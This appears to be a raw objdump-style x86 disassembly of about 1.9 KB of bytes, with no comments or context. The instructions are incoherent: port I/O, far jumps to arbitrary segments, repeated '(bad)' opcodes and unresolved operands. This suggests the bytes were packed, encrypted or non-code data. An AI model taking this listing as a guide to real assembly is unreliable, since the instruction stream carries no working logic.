  40dcb4:	cmp    ebp,DWORD PTR [edi]
  40dcb6:	push   ecx
  40dcb7:	pushf  
  40dcb8:	and    al,0x36
  40dcba:	jmp    DWORD PTR [edx+0x1430e35c]
  40dcc0:	mov    WORD PTR [ecx],?
  40dcc2:	bound  ebx,QWORD PTR [ecx-0x6097b076]
  40dcc8:	dec    esp
  40dcc9:	and    eax,0x83c060d7
  40dcce:	clc    
  40dccf:	shl    ch,1
  40dcd1:	popf   
  40dcd2:	sbb    dl,BYTE PTR [ebp-0x44]
  40dcd5:	push   ss
  40dcd6:	and    eax,0xe6fb6b30
  40dcdb:	mov    esp,0x42a047f4
  40dce0:	and    ah,BYTE PTR [edi]
  40dce2:	cmp    cl,BYTE PTR [esi]
  40dce4:	in     eax,dx
  40dce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dce6:	sub    eax,0xfc283e7c
  40dceb:	nop
  40dcec:	loopne 0x40dd27
  40dcee:	mov    bh,bh
  40dcf0:	and    DWORD PTR [ebp+ebx*4+0x31],esi
  40dcf4:	pop    edi
  40dcf5:	mov    ecx,0xc89e73e1
  40dcfa:	es mov dh,0xdb
  40dcfd:	loop   0x40dcfe
  40dcff:	leave  
  40dd00:	call   0xb8be01f1
  40dd05:	jp     0x40dd43
  40dd07:	pop    ds
  40dd08:	stc    
  40dd09:	or     edi,eax
  40dd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd0c:	pop    ds
  40dd0d:	sbb    BYTE PTR [edx+0x699fffd0],dh
  40dd13:	repz in eax,0x7d
  40dd16:	lea    esp,ds:0x4d5dfcb1
  40dd1c:	je     0x40dd27
  40dd1e:	and    eax,0xb5574e41
  40dd23:	jmp    0x1f1c22a7
  40dd28:	mov    ebp,0x47d60758
  40dd2d:	mov    fs,ebp
  40dd2f:	imul   esp,DWORD PTR [edi-0x47687778],0xffffffa4
  40dd36:	dec    edx
  40dd37:	and    dl,al
  40dd39:	out    0x3c,al
  40dd3b:	or     al,0xf8
  40dd3d:	dec    esp
  40dd3e:	sbb    ebp,edx
  40dd40:	xor    DWORD PTR [esi-0x4fc76335],esp
  40dd46:	mov    dl,0x71
  40dd48:	shl    ch,1
  40dd4a:	fadd   st(5),st
  40dd4c:	ins    DWORD PTR es:[edi],dx
  40dd4d:	xchg   edx,eax
  40dd4e:	pop    ebx
  40dd4f:	push   esi
  40dd50:	xor    DWORD PTR [edx],esi
  40dd52:	cmp    edx,DWORD PTR [eax]
  40dd54:	adc    eax,0xd3b72c6
  40dd59:	sub    al,0x50
  40dd5b:	inc    eax
  40dd5c:	sti    
  40dd5d:	sbb    DWORD PTR [eax+0x68],ebp
  40dd60:	loope  0x40dd3b
  40dd62:	loopne 0x40dcfa
  40dd64:	add    BYTE PTR [edx+ecx*4+0x27],0x24
  40dd69:	xlat   BYTE PTR ds:[ebx]
  40dd6a:	and    al,0xbd
  40dd6c:	fist   DWORD PTR [esi-0x6d6c9b8a]
  40dd72:	xor    esp,DWORD PTR [edx-0x6951e1c2]
  40dd78:	push   DWORD PTR [eax+0x54]
  40dd7b:	push   eax
  40dd7c:	call   0x1a9f:0x791fb5f8
  40dd83:	mov    ah,0x77
  40dd85:	dec    ecx
  40dd86:	adc    DWORD PTR [esi+0x20cf6ee0],esi
  40dd8c:	add    edx,DWORD PTR [ebx-0x1f25e547]
  40dd92:	leave  
  40dd93:	and    al,0xf3
  40dd95:	and    al,0x75
  40dd97:	push   esp
  40dd98:	xlat   BYTE PTR ds:[ebx]
  40dd99:	or     BYTE PTR [edx],0x43
  40dd9c:	adc    DWORD PTR [edx+0x513cb9b1],esi
  40dda2:	xchg   ecx,eax
  40dda3:	test   BYTE PTR [ebx],dl
  40dda5:	les    ebp,FWORD PTR [ebx-0x62]
  40dda8:	or     DWORD PTR ds:0x490c07f2,edx
  40ddae:	mov    dl,0x97
  40ddb0:	xchg   edi,eax
  40ddb1:	dec    edi
  40ddb2:	daa    
  40ddb3:	fdivr  DWORD PTR [ecx]
  40ddb5:	sub    DWORD PTR [esi-0x362f3b8b],ebx
  40ddbb:	add    dl,BYTE PTR [eax+0x32abca59]
  40ddc1:	aam    0xb5
  40ddc3:	inc    edi
  40ddc4:	sbb    esi,ebp
  40ddc6:	test   cl,cl
  40ddc8:	or     DWORD PTR [edi+0x5b],edx
  40ddcb:	mov    ah,0x86
  40ddcd:	loop   0x40dddd
  40ddcf:	(bad)  
  40ddd0:	in     eax,dx
  40ddd1:	iret   
  40ddd2:	stos   BYTE PTR es:[edi],al
  40ddd3:	xor    eax,0x618b79ac
  40ddd8:	jg     0x40dd66
  40ddda:	aad    0x7f
  40dddc:	mov    DWORD PTR [ebp+0xf],esi
  40dddf:	arpl   WORD PTR [eax-0x577d757c],bp
  40dde5:	mov    ecx,0x4c5914f3
  40ddea:	lods   al,BYTE PTR ds:[esi]
  40ddeb:	sar    bl,0x58
  40ddee:	aad    0x4b
  40ddf0:	and    al,0x2a
  40ddf2:	iret   
  40ddf3:	cs std 
  40ddf5:	cld    
  40ddf6:	sbb    al,0x4
  40ddf8:	mov    ah,0xfd
  40ddfa:	(bad)  
  40ddfc:	inc    ebx
  40ddfd:	out    dx,eax
  40ddfe:	ins    BYTE PTR es:[edi],dx
  40ddff:	add    al,0x1b
  40de01:	cmc    
  40de02:	jns    0x40de19
  40de04:	and    BYTE PTR ds:0xcacddb58,ch
  40de0a:	mov    ah,0x84
  40de0c:	add    al,0xda
  40de0e:	data16 shl bl,cl
  40de11:	jbe    0x40de79
  40de13:	or     al,BYTE PTR [ebx+0x56]
  40de16:	clc    
  40de17:	sbb    ebp,edi
  40de19:	inc    ecx
  40de1a:	clc    
  40de1b:	retf   
  40de1c:	outs   dx,DWORD PTR ds:[esi]
  40de1d:	push   0x16
  40de1f:	stos   DWORD PTR es:[edi],eax
  40de20:	cmp    eax,0xef209db
  40de25:	clc    
  40de26:	pop    esi
  40de27:	mov    dl,0x4e
  40de29:	mov    ah,0x1a
  40de2b:	imul   ebp,DWORD PTR [esi+eiz*1+0x7f],0x6b
  40de30:	cmp    al,0x45
  40de32:	ror    bl,0x19
  40de35:	and    dl,BYTE PTR cs:[ebx-0x9411610]
  40de3c:	(bad)  
  40de3d:	cmp    eax,0xb49da498
  40de42:	xor    ch,BYTE PTR [eax-0xb]
  40de45:	pushf  
  40de46:	inc    esp
  40de47:	dec    edx
  40de48:	div    DWORD PTR [ebx+ecx*1+0x1bbffd44]
  40de4f:	addr16 cmp esi,edx
  40de52:	sbb    DWORD PTR [ecx+0x1],ecx
  40de55:	push   ebx
  40de56:	ins    BYTE PTR es:[edi],dx
  40de57:	stc    
  40de58:	xchg   BYTE PTR ss:[edx+ebx*2-0x77],al
  40de5d:	int    0xe0
  40de5f:	mov    edx,0x607d9ad3
  40de64:	inc    eax
  40de65:	jmp    0x3bf1bded
  40de6a:	lock push 0xffffffe9
  40de6d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40de6f:	loope  0x40de82
  40de71:	sub    BYTE PTR [ebp+0x60],ah
  40de74:	aas    
  40de75:	loop   0x40de8c
  40de77:	rcr    BYTE PTR [ecx-0x72217598],0x3c
  40de7e:	adc    al,0x87
  40de80:	ja     0x40debc
  40de82:	fiadd  WORD PTR [edx+0x1e]
  40de85:	inc    ebp
  40de86:	cmp    edx,DWORD PTR [ebp-0x1115c297]
  40de8c:	mov    dh,BYTE PTR [edx-0x2d]
  40de8f:	push   0x978dcbab
  40de94:	popa   
  40de95:	in     al,0x69
  40de97:	xor    ebp,ecx
  40de99:	add    eax,0xb648a3a6
  40de9e:	fld    QWORD PTR [ebx]
  40dea0:	and    eax,0xe93c8bdc
  40dea5:	test   BYTE PTR [eax],0xba
  40dea8:	mov    BYTE PTR [esi-0x3c4b25e8],dh
  40deae:	aad    0x1e
  40deb0:	mov    ch,0xe3
  40deb2:	out    0x39,al
  40deb4:	retf   0x227b
  40deb7:	fstp   DWORD PTR [edi+eiz*8+0x18ea8b08]
  40debe:	ins    DWORD PTR es:[edi],dx
  40debf:	ret    0x10b1
  40dec2:	adc    BYTE PTR [ecx-0x7089ed49],ah
  40dec8:	sar    DWORD PTR [ebp+0x443192cd],1
  40dece:	mov    eax,0x1f00669d
  40ded3:	ror    ah,0xe1
  40ded6:	retf   0x634e
  40ded9:	push   0x7c
  40dedb:	enter  0x7a65,0xd4
  40dedf:	mov    dl,0xa3
  40dee1:	push   es
  40dee2:	adc    cl,BYTE PTR ss:0x6d889f74
  40dee9:	or     eax,eax
  40deeb:	pop    ebx
  40deec:	aaa    
  40deed:	retf   0x3c39
  40def0:	jno    0x40de95
  40def2:	in     eax,0xf4
  40def4:	lahf   
  40def5:	pop    es
  40def6:	nop
  40def7:	stos   DWORD PTR es:[edi],eax
  40def8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40def9:	test   esi,eax
  40defb:	xor    eax,0x28e39442
  40df00:	cs fimul DWORD PTR es:[ebx]
  40df04:	in     eax,dx
  40df05:	pop    esi
  40df06:	ror    DWORD PTR [ebx+0x3a12cc14],1
  40df0c:	push   esp
  40df0d:	js     0x40def8
  40df0f:	aad    0x22
  40df11:	rcl    BYTE PTR [ebp-0x32989c8],cl
  40df17:	or     eax,0x99c7d1a1
  40df1c:	inc    ebp
  40df1d:	bound  esp,QWORD PTR ds:0xe21ab09f
  40df23:	mov    eax,0x61a49941
  40df28:	pop    eax
  40df29:	inc    ecx
  40df2a:	dec    ecx
  40df2b:	ss (bad) 
  40df2d:	jmp    0x948b:0x6310eb90
  40df34:	mov    bl,0xa7
  40df36:	mov    esp,0x1fdf7c19
  40df3b:	or     BYTE PTR [esi-0x34],0x11
  40df3f:	addr16 sahf 
  40df41:	sar    BYTE PTR [ebp-0x55],1
  40df44:	faddp  st(0),st
  40df46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df47:	push   edx
  40df48:	js     0x40df55
  40df4a:	sbb    edx,ecx
  40df4c:	pusha  
  40df4d:	pop    ecx
  40df4e:	pop    esi
  40df4f:	out    dx,eax
  40df50:	xchg   ebx,eax
  40df51:	mov    fs,WORD PTR [ebx-0x5a]
  40df54:	mov    dl,0xcd
  40df56:	mov    al,ds:0x7154294a
  40df5b:	cmp    ebp,DWORD PTR [ecx-0x7d]
  40df5e:	or     al,0xb6
  40df60:	cwde   
  40df61:	inc    DWORD PTR [edi+0x5c96ffa7]
  40df67:	cld    
  40df68:	add    BYTE PTR [ebp-0x6c],ah
  40df6b:	mov    ss,WORD PTR [ecx]
  40df6d:	mov    edi,0xdcaedf3c
  40df72:	std    
  40df73:	jnp    0x40dfb6
  40df75:	nop
  40df76:	in     eax,dx
  40df77:	test   eax,0x85bcb466
  40df7c:	(bad)  
  40df7d:	shr    BYTE PTR [esi-0x4e946d9],1
  40df83:	(bad)  
  40df84:	leave  
  40df85:	push   edx
  40df86:	sbb    BYTE PTR [edi],bl
  40df88:	xchg   esp,eax
  40df89:	fisub  DWORD PTR [esi]
  40df8b:	les    esp,FWORD PTR [di-0x55]
  40df8f:	ins    DWORD PTR es:[edi],dx
  40df90:	mov    ?,WORD PTR [ecx]
  40df92:	aad    0x85
  40df94:	pop    edx
  40df95:	and    eax,0x66722e95
  40df9a:	jp     0x40e017
  40df9c:	int    0x2f
  40df9e:	pop    ebx
  40df9f:	add    dl,BYTE PTR [edx]
  40dfa1:	mov    ?,WORD PTR [eax]
  40dfa3:	xchg   ebx,eax
  40dfa4:	das    
  40dfa5:	sbb    bl,BYTE PTR [edi+0x4c]
  40dfa8:	add    dh,dh
  40dfaa:	popa   
  40dfab:	xor    al,0xe8
  40dfad:	jns    0x40dfcb
  40dfaf:	xchg   ebx,eax
  40dfb0:	popf   
  40dfb1:	mov    al,0x9a
  40dfb3:	pop    es
  40dfb4:	add    ebx,eax
  40dfb6:	xchg   esi,eax
  40dfb7:	cmc    
  40dfb8:	adc    BYTE PTR [edi+0x21],dh
  40dfbb:	test   al,0xc5
  40dfbd:	test   DWORD PTR [ebx+0x19072218],edx
  40dfc3:	aaa    
  40dfc4:	fsub   QWORD PTR [eax-0x126b3440]
  40dfca:	fnstsw WORD PTR [edx-0x5]
  40dfcd:	mov    ds:0x31dfad67,eax
  40dfd2:	cmp    BYTE PTR [edx-0x39],al
  40dfd5:	mov    ds:0x42ddbe82,al
  40dfda:	inc    ebx
  40dfdb:	shl    BYTE PTR [eax+0x3c5bf39f],0x7c
  40dfe2:	ds pusha 
  40dfe4:	mov    ch,0x53
  40dfe6:	push   edx
  40dfe7:	sahf   
  40dfe8:	sub    eax,0x21c9b0ff
  40dfed:	shl    DWORD PTR [eax+0x14d8b330],0x70
  40dff4:	xchg   ebp,eax
  40dff5:	rcr    DWORD PTR [esi-0x4f134a58],0x8b
  40dffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dffd:	stos   DWORD PTR es:[edi],eax
  40dffe:	pop    ebp
  40dfff:	add    eax,0x60a8a21d
  40e004:	cmp    al,BYTE PTR [edx-0x45]
  40e007:	clc    
  40e008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e009:	out    dx,al
  40e00a:	add    BYTE PTR [edx+0x69],ah
  40e00d:	aaa    
  40e00e:	cmp    DWORD PTR [edx+0x81ad7d1],eax
  40e014:	adc    al,0xb
  40e016:	sbb    eax,0x9f9c8748
  40e01b:	in     eax,dx
  40e01c:	xchg   esi,eax
  40e01d:	adc    DWORD PTR [ecx+edx*8-0xf],esi
  40e021:	add    BYTE PTR [edx],bl
  40e023:	(bad)  
  40e024:	xchg   esp,eax
  40e025:	mov    edi,0xdcef6030
  40e02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e02b:	sbb    eax,0x81e8d3c0
  40e030:	jno    0x40e056
  40e032:	(bad)  
  40e033:	outs   dx,BYTE PTR ds:[esi]
  40e034:	xor    al,0x95
  40e036:	outs   dx,BYTE PTR ds:[esi]
  40e037:	sbb    al,0x5f
  40e039:	std    
  40e03a:	and    dl,BYTE PTR [edi-0x52136d8]
  40e040:	push   DWORD PTR [esi+0x63]
  40e043:	stos   DWORD PTR es:[edi],eax
  40e044:	sbb    bh,0xbe
  40e047:	adc    ecx,ecx
  40e049:	scas   eax,DWORD PTR es:[edi]
  40e04a:	cmp    dl,BYTE PTR [eax+0x6dab3807]
  40e050:	dec    ebp
  40e051:	and    eax,0x4a8f4c5e
  40e056:	inc    edx
  40e057:	jae    0x40dffb
  40e059:	pop    edi
  40e05a:	lea    ecx,[edx-0x522fc4c1]
  40e060:	lahf   
  40e061:	add    DWORD PTR [edx],esp
  40e063:	retf   0x2f5c
  40e066:	adc    eax,0xfec25ea4
  40e06b:	and    al,0xc1
  40e06d:	and    al,0x1
  40e06f:	leave  
  40e070:	ins    BYTE PTR es:[edi],dx
  40e071:	repnz shl BYTE PTR [ecx+0x34],cl
  40e075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e076:	pop    ebx
  40e077:	adc    al,0x7
  40e079:	out    dx,al
  40e07a:	ret    
  40e07b:	dec    esp
  40e07c:	inc    esi
  40e07d:	xchg   esp,eax
  40e07e:	add    DWORD PTR [ecx+0x61973768],ebp
  40e084:	in     al,0x43
  40e086:	(bad)  
  40e087:	stos   DWORD PTR es:[edi],eax
  40e088:	push   esi
  40e089:	sbb    DWORD PTR [esi-0x508d87a8],ebx
  40e08f:	hlt    
  40e090:	fsubr  QWORD PTR [edx-0x7e]
  40e093:	pop    edi
  40e094:	dec    esp
  40e095:	sbb    al,0xfe
  40e097:	lds    edi,FWORD PTR [ecx]
  40e099:	lds    ecx,FWORD PTR [edx+0x167ecac2]
  40e09f:	mov    eax,0x738fa581
  40e0a4:	pop    ebx
  40e0a5:	(bad)  
  40e0a6:	jge    0x40e0b5
  40e0a8:	mov    ebp,0xec94a165
  40e0ad:	jle    0x40e0ab
  40e0af:	(bad)  
  40e0b0:	mov    edi,0xa23bab84
  40e0b5:	push   ds
  40e0b6:	push   ebx
  40e0b7:	out    0x68,al
  40e0b9:	dec    edx
  40e0ba:	aas    
  40e0bb:	pop    ebx
  40e0bc:	adc    DWORD PTR ds:0x3c0416d6,ebx
  40e0c2:	int    0x7
  40e0c4:	mov    ds:0x2de99565,eax
  40e0c9:	aam    0xc
  40e0cb:	xchg   BYTE PTR [eax+0x16],ch
  40e0ce:	push   cs
  40e0cf:	mov    esi,DWORD PTR [edi+0x64]
  40e0d2:	mov    al,0xc2
  40e0d4:	xchg   ebp,eax
  40e0d5:	push   es
  40e0d6:	ja     0x40e120
  40e0d8:	push   ebx
  40e0d9:	push   0xafef15c
  40e0de:	xor    ebp,esp
  40e0e0:	cmp    eax,0x516bfc91
  40e0e5:	test   BYTE PTR [eax-0xe6061d7],ah
  40e0eb:	in     al,dx
  40e0ec:	inc    edx
  40e0ed:	add    DWORD PTR [edx],ebp
  40e0ef:	add    eax,0x73a8bad1
  40e0f4:	leave  
  40e0f5:	ss pop ds
  40e0f7:	std    
  40e0f8:	scas   al,BYTE PTR es:[edi]
  40e0f9:	jno    0x40e087
  40e0fb:	aad    0xb7
  40e0fd:	lods   eax,DWORD PTR ds:[esi]
  40e0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0ff:	dec    edx
  40e100:	sbb    eax,ecx
  40e102:	and    al,0x26
  40e104:	and    DWORD PTR [edx],eax
  40e106:	enter  0x8e42,0x4a
  40e10a:	fimul  DWORD PTR [ebp-0x8]
  40e10d:	push   esi
  40e10e:	(bad)  
  40e10f:	xchg   ebx,eax
  40e110:	xchg   esi,eax
  40e111:	test   al,0x56
  40e113:	inc    ebx
  40e114:	mov    al,ds:0xabca1373
  40e119:	and    esi,ebp
  40e11b:	mov    eax,0x99b412d1
  40e120:	aaa    
  40e121:	sub    DWORD PTR [edx],ebp
  40e123:	adc    cl,BYTE PTR [ebx+0x11f83fa7]
  40e129:	cwde   
  40e12a:	dec    ebp
  40e12b:	mov    edx,0x5404d954
  40e130:	and    DWORD PTR [ebx-0x23c38a21],edx
  40e136:	ror    DWORD PTR [esi+0xc080f06],0xf9
  40e13d:	stc    
  40e13e:	sbb    al,0x65
  40e140:	test   eax,0xf0714fc9
  40e145:	shr    DWORD PTR [edx],cl
  40e147:	jmp    0x21bedc0
  40e14c:	or     al,0xac
  40e14e:	cs push ebp
  40e150:	aaa    
  40e151:	adc    esi,DWORD PTR [ebp+0x5db43cb7]
  40e157:	pop    ebx
  40e158:	mov    al,ds:0xb1fcd9b6
  40e15d:	cmp    dh,BYTE PTR [edi+0x458d55e3]
  40e163:	mov    ah,0x73
  40e165:	lea    ebp,[ebx+0x6c]
  40e168:	stos   BYTE PTR es:[edi],al
  40e169:	push   ecx
  40e16a:	add    bl,BYTE PTR [ebp-0x32]
  40e16d:	sbb    edx,ebp
  40e16f:	fld    TBYTE PTR [ecx]
  40e171:	or     eax,0x8f9d9596
  40e176:	jns    0x40e0fa
  40e178:	xchg   ecx,eax
  40e179:	jne    0x40e1d4
  40e17b:	loope  0x40e1a6
  40e17d:	fwait
  40e17e:	push   ecx
  40e17f:	jns    0x40e150
  40e181:	hlt    
  40e182:	adc    al,0x1b
  40e184:	data16 jae 0x40e115
  40e187:	sub    bl,0xba
  40e18a:	add    eax,0x820c3cfd
  40e18f:	sub    al,0xa4
  40e191:	cmp    BYTE PTR [esp+ebx*1+0x2a4d54ee],0x40
  40e199:	fld    QWORD PTR [edi-0x1e092070]
  40e19f:	jg     0x40e133
  40e1a1:	adc    ebx,edi
  40e1a3:	cwde   
  40e1a4:	nop
  40e1a5:	idiv   BYTE PTR [edx-0x6f]
  40e1a8:	add    BYTE PTR [ecx-0x1f],cl
  40e1ab:	mov    BYTE PTR [edx+0xe],bl
  40e1ae:	xchg   DWORD PTR [esi-0x2c],esi
  40e1b1:	pop    ebx
  40e1b2:	(bad)  
  40e1b3:	sbb    DWORD PTR [ebx],eax
  40e1b5:	inc    edi
  40e1b6:	and    al,0xee
  40e1b8:	iret   
  40e1b9:	mov    esi,0x6d785594
  40e1be:	fwait
  40e1bf:	test   DWORD PTR [ecx],ebp
  40e1c1:	push   edx
  40e1c2:	add    esi,edi
  40e1c4:	gs add eax,0x6b68a89e
  40e1ca:	dec    esp
  40e1cb:	mov    ch,0x96
  40e1cd:	xchg   edi,eax
  40e1ce:	pop    ds
  40e1cf:	repnz inc edi
  40e1d1:	cmp    edi,esi
  40e1d3:	sub    BYTE PTR [ebp+0x47657bd8],bl
  40e1d9:	pop    ecx
  40e1da:	xor    eax,0x15941798
  40e1df:	mov    eax,cs
  40e1e1:	ins    DWORD PTR es:[edi],dx
  40e1e2:	add    eax,0x73d0a385
  40e1e7:	sub    ebp,DWORD PTR [esi-0x17ea4a53]
  40e1ed:	mov    cl,0x74
  40e1ef:	outs   dx,BYTE PTR ds:[esi]
  40e1f0:	les    edi,FWORD PTR [ebp-0x44]
  40e1f3:	inc    eax
  40e1f4:	and    al,bl
  40e1f6:	inc    edi
  40e1f7:	and    BYTE PTR [edx+0x70207985],dh
  40e1fd:	sahf   
  40e1fe:	mov    eax,?
  40e200:	jnp    0x40e262
  40e202:	adc    al,0xab
  40e204:	and    ebp,edi
  40e206:	pop    ecx
  40e207:	dec    eax
  40e208:	addr16 push ebx
  40e20a:	push   ss
  40e20b:	xor    BYTE PTR [ebp+0x279657b2],bh
  40e211:	pop    eax
  40e212:	test   DWORD PTR [esi-0x33],edx
  40e215:	lds    ebx,FWORD PTR [esi-0x2e2b1417]
  40e21b:	retf   
  40e21c:	nop
  40e21d:	mov    BYTE PTR [ecx],dh
  40e21f:	retf   
  40e220:	mov    eax,ds:0xb4d4fe5a
  40e225:	jo     0x40e28b
  40e227:	out    0xd2,al
  40e229:	mov    WORD PTR [edx-0x7c],es
  40e22c:	iret   
  40e22d:	push   cs
  40e22e:	aam    0xec
  40e230:	cmp    dl,ah
  40e232:	xchg   ebp,eax
  40e233:	cdq    
  40e234:	aad    0x3c
  40e236:	std    
  40e237:	xchg   BYTE PTR [edi+0x2dec709d],cl
  40e23d:	jmp    0x3a7cfe78
  40e242:	in     al,0x69
  40e244:	jae    0x40e2be
  40e246:	push   eax
  40e247:	mov    ds:0x29432b9,al
  40e24c:	xchg   ebx,eax
  40e24d:	js     0x40e2c6
  40e24f:	idiv   ecx
  40e251:	mov    esp,0x5698f40b
  40e256:	test   al,0x4
  40e258:	xchg   esp,eax
  40e259:	inc    ebx
  40e25a:	aam    0x88
  40e25c:	or     DWORD PTR [ecx+eax*1-0xe676016],esp
  40e263:	je     0x40e298
  40e265:	cmp    ebx,DWORD PTR [esi-0xc9288f9]
  40e26b:	stc    
  40e26c:	dec    edx
  40e26d:	(bad)
  40e270:	ret    
  40e271:	test   BYTE PTR [eax+edi*1+0x1a],al
  40e275:	pop    ss
  40e276:	cmp    dl,BYTE PTR [edx]
  40e278:	cmp    DWORD PTR [ecx],ebx
  40e27a:	xchg   ebx,eax
  40e27b:	cmp    BYTE PTR [ecx],cl
  40e27d:	cmp    DWORD PTR [ebx],esp
  40e27f:	psrlw  mm6,QWORD PTR [ecx-0x34]
  40e283:	pusha  
  40e284:	push   0x799d9a1c
  40e289:	hlt    
  40e28a:	enter  0xb236,0xb4
  40e28e:	sub    ecx,esi
  40e290:	ja     0x40e2dd
  40e292:	xchg   edx,eax
  40e293:	mov    bl,0xda
  40e295:	xchg   edx,eax
  40e296:	pop    esp
  40e297:	imul   esp,DWORD PTR [ebx+0x74],0xb03b4b19
  40e29e:	mov    eax,0xb42589e0
  40e2a3:	mov    WORD PTR [ebx+0x16e0a107],?
  40e2a9:	jl     0x40e2ee
  40e2ab:	add    edx,edx
  40e2ad:	dec    eax
  40e2ae:	stos   DWORD PTR es:[edi],eax
  40e2af:	jo     0x40e2d2
  40e2b1:	mov    ah,0x54
  40e2b3:	inc    eax
  40e2b4:	adc    al,0x50
  40e2b6:	imul   ebp,DWORD PTR [esi],0x5de76b90
  40e2bc:	out    dx,al
  40e2bd:	stos   BYTE PTR es:[edi],al
  40e2be:	sbb    DWORD PTR [ebp+0x73],ecx
  40e2c1:	shr    dh,1
  40e2c3:	and    BYTE PTR ds:0x12c22cc6,bh
  40e2c9:	push   edi
  40e2ca:	jmp    0x40e287
  40e2cc:	jecxz  0x40e29f
  40e2ce:	sbb    DWORD PTR [esi-0x362021be],ecx
  40e2d4:	mov    al,0x4d
  40e2d6:	jmp    0x9bf2:0xb83c6737
  40e2dd:	sub    BYTE PTR [edx],ah
  40e2df:	push   cs
  40e2e0:	daa    
  40e2e1:	hlt    
  40e2e2:	xor    al,0x63
  40e2e4:	mov    dl,0xb3
  40e2e6:	fwait
  40e2e7:	jle    0x40e2c1
  40e2e9:	mov    edi,0x952e253c
  40e2ee:	(bad)  [eax-0x517c5357]
  40e2f4:	inc    ebp
  40e2f5:	dec    esi
  40e2f6:	jp     0x40e2b6
  40e2f8:	outs   dx,BYTE PTR ds:[esi]
  40e2f9:	sbb    eax,0x44c0dd2b
  40e2fe:	jecxz  0x40e28a
  40e300:	adc    edx,esi
  40e302:	pusha  
  40e303:	jmp    0x40e302
  40e305:	jle    0x40e351
  40e307:	enter  0x32d8,0xbb
  40e30b:	loop   0x40e2f7
  40e30d:	call   0x8342bed
  40e312:	jbe    0x40e2da
  40e314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e315:	sbb    BYTE PTR [ebx+0x68],al
  40e318:	and    BYTE PTR [ebx+0x587fd445],ah
  40e31e:	push   edi
  40e31f:	jmp    0x40e303
  40e321:	stc    
  40e322:	dec    eax
  40e323:	lds    ecx,FWORD PTR [eax-0x2bcbd04b]
  40e329:	push   0xb0f6a9dd
  40e32e:	fptan  
  40e330:	inc    esi
  40e331:	push   ss
  40e332:	dec    esp
  40e333:	mov    dh,BYTE PTR [ebx]
  40e335:	dec    ebp
  40e336:	call   DWORD PTR [edx+eax*2+0x4e]
  40e33a:	inc    ebx
  40e33b:	mov    ds,esi
  40e33d:	add    al,0x30
  40e33f:	xchg   edx,eax
  40e340:	pop    edx
  40e341:	stos   BYTE PTR es:[edi],al
  40e342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e343:	sbb    al,0x36
  40e345:	mov    ebx,0xd38e633e
  40e34a:	mov    al,dh
  40e34c:	inc    edx
  40e34d:	mov    al,0x84
  40e34f:	pop    edx
  40e350:	scas   eax,DWORD PTR es:[edi]
  40e351:	scas   eax,DWORD PTR es:[edi]
  40e352:	pop    edx
  40e353:	int3   
  40e354:	inc    edi
  40e355:	call   0x6c59:0x688ff994
  40e35c:	imul   edx,DWORD PTR [ebx+ebp*1+0x41],0x15
  40e361:	jle    0x40e31a
  40e363:	xchg   ebx,eax
  40e364:	push   0x1fd5b002
  40e369:	xor    BYTE PTR [eax+eiz*4-0x38d984c9],ch
  40e370:	cwde   
  40e371:	xchg   edx,eax
  40e372:	ss jmp 0x79e9:0x70460dfc
  40e37a:	imul   eax,eax,0xffffff99
  40e37d:	loopne 0x40e36f
  40e37f:	std    
  40e380:	sbb    ebp,DWORD PTR [ebx]
  40e382:	mov    ds:0x294a75ff,eax
  40e387:	adc    eax,0x61bca4ff
  40e38c:	int    0x31
  40e38e:	cmp    ch,BYTE PTR [edi+0x73]
  40e391:	xor    dh,al
  40e393:	sub    eax,0xa850dbd0
  40e398:	mov    al,0xe3
  40e39a:	leave  
  40e39b:	jecxz  0x40e3d2
  40e39d:	inc    esi
  40e39e:	loopne 0x40e38a
  40e3a0:	loope  0x40e3b4
  40e3a2:	inc    ecx
  40e3a3:	loopne 0x40e33a
  40e3a5:	xor    DWORD PTR [ebx-0x5e],0xffffffd7
  40e3a9:	mov    DWORD PTR [ebx+0x37],ebp
  40e3ac:	iret   
  40e3ad:	out    0xf6,al
  40e3af:	sbb    BYTE PTR [edi+0x71],dl
  40e3b2:	add    DWORD PTR [edi],ecx
  40e3b4:	or     BYTE PTR [esp+ebx*1-0x3d],bl
  40e3b8:	mov    ebp,0x465e9091
  40e3bd:	jle    0x40e399
  40e3bf:	jp     0x40e3e5
  40e3c1:	das    
  40e3c2:	sub    edx,edi
  40e3c4:	dec    edx
  40e3c5:	fdiv   DWORD PTR [edx+0x5a]
  40e3c8:	and    edx,DWORD PTR [ecx]
  40e3ca:	call   0x4c09d09c
  40e3cf:	imul   edi,DWORD PTR [ebx],0xffffffd2
  40e3d2:	cmp    ah,BYTE PTR [ebp-0x504eed0]
  40e3d8:	jecxz  0x40e3b3
  40e3da:	xchg   esi,eax
  40e3db:	in     eax,dx
  40e3dc:	js     0x40e41f
  40e3de:	jge    0x40e45c
  40e3e0:	out    0xf7,eax
  40e3e2:	sbb    eax,0xef065892
  40e3e7:	xchg   ebp,eax
  40e3e8:	jnp    0x40e459
  40e3ea:	call   0x361a:0xb3e024a5
  40e3f1:	xchg   edi,eax
  40e3f2:	push   ebx
  40e3f3:	sbb    BYTE PTR ds:0xa3bcb8bc,dl
  40e3f9:	push   ss
  40e3fa:	lods   al,BYTE PTR ds:[esi]
  40e3fb:	dec    esi
  40e3fc:	sub    ah,cl
  40e3fe:	data16 xor al,0x79
  40e401:	jnp    0x40e39b
  40e403:	cli    
  40e404:	jmp    0x40e3e0
  40e406:	test   BYTE PTR [edx-0x3e],cl
  40e409:	add    cl,BYTE PTR [eax+0x65346a5a]
  40e40f:	jno    0x40e45c
  40e411:	cmp    al,0x24
  40e413:	aad    0xa3
  40e415:	mov    ecx,0xe20983ea
  40e41a:	inc    BYTE PTR [edi+0x56]
  40e41d:	mov    ecx,0x72755067
  40e422:	xchg   ecx,eax
  40e423:	push   esi
  40e424:	dec    edi
  40e425:	cmp    eax,0xa93aff52
  40e42a:	or     eax,0xe0521ac6
